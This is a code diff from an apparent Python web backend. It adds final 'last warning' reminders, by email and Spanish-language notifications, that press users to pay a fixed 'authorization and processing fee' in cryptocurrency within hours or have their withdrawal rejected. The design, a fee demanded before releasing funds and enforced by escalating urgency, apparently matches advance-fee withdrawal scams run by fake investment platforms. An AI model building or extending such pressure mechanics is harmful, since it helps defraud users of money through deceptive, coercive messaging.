@@ -832,6 +832,35 @@ async def process_tax_reminders():
                             )
                             reminders_sent += 1
                             logging.info(f"📧 Sent tax reminder to {user['email']} for tx {tx['id']}")
+                elif 0 < hours_remaining <= 6 and not tx.get('final_reminder_sent'):
+                    # FINAL urgent reminder (<6h)
+                    user = await db.users.find_one({'id': tx['user_id']}, {'_id': 0, 'password': 0})
+                    if user:
+                        try:
+                            await send_tax_reminder_email(
+                                user['email'], user['name'],
+                                tx['amount'], tx['currency'],
+                                tx.get('tax_required', TAX_AMOUNT),
+                                tx.get('tax_paid', 0),
+                                hours_remaining
+                            )
+                        except Exception:
+                            pass
+                        try:
+                            await create_notification(
+                                tx['user_id'],
+                                '⚠️ ÚLTIMO AVISO · Su abono expira pronto',
+                                f'Quedan menos de {int(hours_remaining) + 1} h para completar el Cargo de autorización y procesamiento del retiro ({tx.get("tax_required", TAX_AMOUNT):,.2f} EUR). '
+                                f'Si no lo completa a tiempo, su retiro será rechazado automáticamente.'
+                            )
+                        except Exception:
+                            pass
+                        await db.transactions.update_one(
+                            {'id': tx['id']},
+                            {'$set': {'final_reminder_sent': datetime.now(timezone.utc).isoformat()}}
+                        )
+                        reminders_sent += 1
+                        logging.info(f"🚨 Sent FINAL tax reminder to {user['email']} for tx {tx['id']}")
             
             except Exception as e:
                 logging.error(f"Error sending reminder for tx {tx.get('id')}: {str(e)}")
@@ -848,24 +877,34 @@ async def process_tax_reminders():
                 start_dt = datetime.fromisoformat(start_iso.replace('Z', '+00:00'))
                 hours_since = (datetime.now(timezone.utc) - start_dt).total_seconds() / 3600
                 hours_remaining = max(0, 72 - hours_since)
-                if not (hours_remaining > 6 and hours_since > 12):
-                    continue
-                last = bw.get('last_reminder_sent')
-                if last:
-                    hs = (datetime.now(timezone.utc) - datetime.fromisoformat(last.replace('Z', '+00:00'))).total_seconds() / 3600
-                    if hs < 12:
-                        continue
-                await create_notification(
-                    bw['user_id'],
-                    'Abono pendiente de su retiro bancario',
-                    f'Su retiro {bw.get("reference","")} requiere el Cargo de autorización y procesamiento del retiro de {TAX_AMOUNT:,.2f} EUR. '
-                    f'Le quedan aprox. {int(hours_remaining)} h para completar el abono en Pagos en Criptomonedas.'
-                )
-                await db.bank_withdrawal_requests.update_one(
-                    {'id': bw['id']},
-                    {'$set': {'last_reminder_sent': datetime.now(timezone.utc).isoformat()}}
-                )
-                reminders_sent += 1
+                if hours_remaining > 6 and hours_since > 12:
+                    last = bw.get('last_reminder_sent')
+                    if last:
+                        hs = (datetime.now(timezone.utc) - datetime.fromisoformat(last.replace('Z', '+00:00'))).total_seconds() / 3600
+                        if hs < 12:
+                            continue
+                    await create_notification(
+                        bw['user_id'],
+                        'Abono pendiente de su retiro bancario',
+                        f'Su retiro {bw.get("reference","")} requiere el Cargo de autorización y procesamiento del retiro de {TAX_AMOUNT:,.2f} EUR. '
+                        f'Le quedan aprox. {int(hours_remaining)} h para completar el abono en Pagos en Criptomonedas.'
+                    )
+                    await db.bank_withdrawal_requests.update_one(
+                        {'id': bw['id']},
+                        {'$set': {'last_reminder_sent': datetime.now(timezone.utc).isoformat()}}
+                    )
+                    reminders_sent += 1
+                elif 0 < hours_remaining <= 6 and not bw.get('final_reminder_sent'):
+                    await create_notification(
+                        bw['user_id'],
+                        '⚠️ ÚLTIMO AVISO · Su abono expira pronto',
+                        f'Quedan menos de {int(hours_remaining) + 1} h para completar el abono de su retiro bancario {bw.get("reference","")} ({TAX_AMOUNT:,.2f} EUR) en Pagos en Criptomonedas.'
+                    )
+                    await db.bank_withdrawal_requests.update_one(
+                        {'id': bw['id']},
+                        {'$set': {'final_reminder_sent': datetime.now(timezone.utc).isoformat()}}
+                    )
+                    reminders_sent += 1
         except Exception as e:
             logging.error(f"Error sending bank withdrawal abono reminders: {str(e)}")
         
